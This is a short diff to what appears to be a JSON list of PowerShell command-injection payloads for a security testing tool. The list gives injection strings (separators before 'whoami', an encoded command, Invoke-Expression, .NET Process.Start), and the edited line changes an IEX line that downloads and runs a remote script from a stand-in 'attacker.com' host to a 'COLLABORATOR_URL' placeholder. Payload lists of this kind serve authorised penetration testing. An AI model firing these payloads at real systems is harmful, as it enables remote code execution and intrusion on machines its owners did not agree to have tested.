@@ -22,7 +22,7 @@
         {"payload": "; whoami", "description": "PowerShell semicolon separator", "waf_bypass": false},
         {"payload": "| whoami", "description": "PowerShell pipe operator", "waf_bypass": false},
         {"payload": "& whoami", "description": "PowerShell call operator", "waf_bypass": false},
-        {"payload": "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')", "description": "IEX remote script download and execute", "waf_bypass": false},
+        {"payload": "IEX (New-Object Net.WebClient).DownloadString('http://COLLABORATOR_URL/payload.ps1')", "description": "IEX remote script download — Collaborator interaction confirms RCE; do not host real payload", "waf_bypass": false},
         {"payload": "powershell -EncodedCommand dwBoAG8AYQBtAGkA", "description": "Base64 encoded command execution (whoami)", "waf_bypass": false},
         {"payload": "Invoke-Expression 'whoami'", "description": "Invoke-Expression string eval", "waf_bypass": false},
         {"payload": ";[System.Diagnostics.Process]::Start('cmd','/c whoami')", "description": "Process.Start via .NET", "waf_bypass": false}
